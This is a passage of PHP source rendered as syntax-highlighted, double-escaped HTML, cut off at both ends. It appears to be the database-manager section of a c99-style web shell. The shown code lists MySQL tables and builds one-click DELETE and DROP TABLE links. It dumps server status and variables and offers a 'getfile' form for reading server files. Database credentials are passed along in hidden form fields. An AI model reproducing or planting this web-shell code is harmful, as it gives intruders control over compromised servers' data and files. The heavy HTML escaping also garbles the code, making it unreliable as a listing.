class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="nv">$w</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
                  <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
                    <span class="nv">$w</span> <span class="o">.=</span> <span class="s2">&quot; `&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;` = &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; AND&quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
                  <span class="p">}</span>
                  <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$w</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">);</span> <span class="p">}</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow[]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$v</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&amp;gt;NULL&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
                    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
                  <span class="p">}</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_query=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Delete&amp;lt;/a&amp;gt; &quot;</span><span class="p">;</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl_act=insert&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_insert_q=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Edit&amp;lt;/a&amp;gt; &quot;</span><span class="p">;</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
                  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
               <span class="p">}</span>
               <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
               <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;p align=</span><span class="se">\&quot;</span><span class="s2">left</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=arrow_ltr</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2"> ^ </span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
               <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;With selected:&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
               <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">deleterow</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Delete&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
               <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
         <span class="p">}</span>
         <span class="k">else</span> <span class="p">{</span>
           <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLE STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();</span> <span class="p">}</span>
           <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;form method=&quot;POST&quot;&amp;gt;</span>
<span class="x">    &amp;lt;table&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;input type=&quot;checkbox&quot; name=&quot;boxtbl_all&quot; value=&quot;1&quot;&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Table&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Rows&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Engine&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Created&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Modified&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Size&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Action&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="cp">&lt;?php</span>
             <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
             <span class="nv">$tsize</span> <span class="o">=</span> <span class="nv">$trows</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
             <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span>
               <span class="nv">$tsize</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">];</span>
               <span class="nv">$trows</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">];</span>
               <span class="nv">$size</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">]);</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;tr&amp;gt;</span>
<span class="x">            &amp;lt;td&amp;gt;&amp;lt;input type=&quot;checkbox&quot; name=&quot;boxtbl[]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_tbl=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;b&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Engine&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Create_time&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Update_time&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$size</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/td&amp;gt;</span>
<span class="x">            &amp;lt;td&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_act=query&amp;sql_query=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;Empty&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_act=query&amp;sql_query=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DROP TABLE `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;Drop&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_tbl_act=insert&amp;sql_tbl=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;Insert&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;/tr&amp;gt;</span>
<span class="cp">&lt;?php</span>
               <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
             <span class="p">}</span>
             <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
                   <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;th&amp;gt;+&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;</span><span class="si">$i</span><span class="s2"> table(s)&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;</span><span class="si">$trows</span><span class="s2">&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;</span><span class="si">$row[1]</span><span class="s2">&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;</span><span class="si">$row[10]</span><span class="s2">&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;</span><span class="si">$row[11]</span><span class="s2">&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nv">$tsize</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;/th&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">    &amp;lt;div align=&quot;right&quot;&amp;gt;</span>
<span class="x">    &amp;lt;select name=&quot;sql_act&quot;&amp;gt;</span>
<span class="x">        &amp;lt;option value=&quot;&quot;&amp;gt;With selected:&amp;lt;/option&amp;gt;</span>
<span class="x">        &amp;lt;option value=&quot;tbldrop&quot;&amp;gt;Drop&amp;lt;/option&amp;gt;</span>
<span class="x">        &amp;lt;option value=&quot;tblempty&quot;&amp;gt;Empty&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">        &amp;lt;option value=&quot;tbldump&quot;&amp;gt;Dump&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">        &amp;lt;option value=&quot;tblcheck&quot;&amp;gt;Check table&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">        &amp;lt;option value=&quot;tbloptimize&quot;&amp;gt;Optimize table&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">        &amp;lt;option value=&quot;tblrepair&quot;&amp;gt;Repair table&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">        &amp;lt;option value=&quot;tblanalyze&quot;&amp;gt;Analyze table&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">    &amp;lt;/select&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;submit&quot; value=&quot;Confirm&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/div&amp;gt;</span>
<span class="x">    &amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
             <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
           <span class="p">}</span>
         <span class="p">}</span>
       <span class="p">}</span>
     <span class="p">}</span>
   <span class="p">}</span>
   <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;newdb&quot;</span><span class="p">,</span><span class="s2">&quot;serverstatus&quot;</span><span class="p">,</span><span class="s2">&quot;servervars&quot;</span><span class="p">,</span><span class="s2">&quot;processes&quot;</span><span class="p">,</span><span class="s2">&quot;getfile&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;table&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Create new DB:&amp;lt;/b&amp;gt;</span>
<span class="x">        &amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newdb&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;text&quot; name=&quot;sql_newdb&quot; size=&quot;20&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;submit&quot; value=&quot;Create&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;&amp;lt;b&amp;gt;View File:&amp;lt;/b&amp;gt;</span>
<span class="x">        &amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;getfile&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;text&quot; name=&quot;sql_getfile&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">            &amp;lt;input type=&quot;submit&quot; value=&quot;Get&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="cp">&lt;?php</span>
       <span class="p">}</span>
       <span class="c1">###[ SQL ACTIONS ]###</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newdb&quot;</span><span class="p">)</span> <span class="p">{</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
           <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&amp;lt;br&amp;gt;Reason:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();}</span>
         <span class="p">}</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;serverstatus&quot;</span><span class="p">)</span> <span class="p">{</span>
           <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Server-status variables:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
           <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;servervars&quot;</span><span class="p">)</span> <span class="p">{</span>
           <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW VARIABLES&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Server variables:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
